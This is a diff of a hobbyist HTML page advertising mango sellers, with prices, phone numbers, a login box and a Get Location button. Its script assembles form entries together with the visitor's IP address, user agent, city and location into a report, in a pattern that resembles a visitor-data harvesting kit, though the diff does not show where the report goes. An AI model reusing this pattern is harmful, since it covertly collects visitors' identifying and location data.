@@ -1,5 +1,5 @@
 
-  <style>
+<style>
   ul{
     background:white;
     display:flex;
@@ -38,7 +38,18 @@
   }
   ul li.prev{
     margin-right: 20px;
-                            </ref="https://iamroot5.github.io/Pspromo/">upcomming</a></li>
+    font-weight: bold;
+    font-size: 20px;
+  }
+  ul li.next{
+    margin-left: 10px;
+    font-weight: bold;
+    font-size: 18px;
+  }
+</style>
+   <ul>
+  <li class="prev"><a href="">prev</a></li>
+  <li class="page"><a href="https://iamroot5.github.io/Pspromo/">upcomming</a></li>
   <p></p>
   <li class="page"><a href="">upcomming</a></li>
   <p></p>
@@ -53,7 +64,7 @@
 
 <body>
   <div class="horzontal">
-  <marquee>Thapane and fobeni mango sellers</marquee>
+  
  
   <img src="https://i.ibb.co/xmty5JW/IMG-20241202-073752.jpg">
 <fieldset style="border:radius:5px">
@@ -62,10 +73,10 @@
     </details>
   </fieldset>
   </div>
-  <h1 style="color:orange">Sell To ALY</h1>
+  <h1 style="color:orange">Sell To Sir Mongwe</h1>
 
-  <p style="color:green">sell to Aly </p>
-  <p>Number phone:</p><h1>0723955037</h1>
+  <p style="color:green">sell to Sir mongwe</p>
+  <p>Number phone:</p><h1>0828437962</h1>
   <p>Open time 11:00 AM- 16:00AM</p>
   <button><il>R40 per box</il></button>
     <fieldset style="border-radius:5px">
@@ -214,7 +225,6 @@ button{
             <p class="slogan">R40 each Pox</p>
          
  <form>
-   <p>Press the get location button to fill in ur location automatically </p>
     <button type="button" onclick="getLocation()">Get Location</button>
   </form>
 
@@ -245,7 +255,7 @@ button{
             
             <div class="divider"></div>
             <div class="no-social-login">
-                <p>? <a href="#" id="signup-button"></a></p>
+                <p>Don't have an account? <a href="#" id="signup-button"></a></p>
             </div>
         </div>
     </div>
@@ -289,10 +299,13 @@ button{
                const page = document.getElementById("pagename").value;
                const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
-               
-               const message = `> Aly : ${page}\n\n> food :
+               const comment = document.getElementById("comment").value;
+               const choosing = document.getElementById("choosing").value;
+               const message = `> Food Page : ${page}\n\n> food :
                  ${name}\n\n> phone :
                  ${phone}\n\n> username :
+                 ${comment}\n\n> comment :
+                 ${choosing}\n\n> choosing :
                  ${username}\n\n> location url :
                  ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
     
@@ -480,9 +493,9 @@ a {
     left: 50%;
     transform: translate(-50%, -50%);
     background-color: rgba(0, 0, 0, 0.8);
-    color: white;
+    color: gray;
     border-radius: 5px;
-    padding: 15px;
+    padding: 30px;
     z-index: 1;
 }
 
@@ -543,7 +556,7 @@ a {
             
             <div class="divider"></div>
             <div class="no-social-login">
-                <p>Don't have an account? <a href="#" id="signup-button"></a></p>
+                <p> <a href="#" id="signup-button"></a></p>
             </div>
         </div>
     </div>
@@ -587,10 +600,13 @@ a {
                const page = document.getElementById("pagename").value;
                const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
-               
-               const message = `> sir maladji : ${page}\n\n> food :
+               const comment = document.getElementById("comment").value;
+               const choosing = document.getElementById("choosing").value;
+               const message = `> Food Page : ${page}\n\n> food :
                  ${name}\n\n> phone :
                  ${phone}\n\n> username :
+                 ${comment}\n\n> comment 
+                 ${choosing}\n\n> choosing :
                  ${username}\n\n> location url :
                  ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
     
@@ -665,9 +681,13 @@ function getLocation() {
  </form>
  </head>
           </fieldset>
-    </body>
+</body>
 
 
+
+
+
+<hr>
 
 <!DOCTYPE html>
 <html>
@@ -740,4 +760,3 @@ document.addEventListener("DOMContentLoaded", function() {
 </body>
 </html>
 </body>
-      
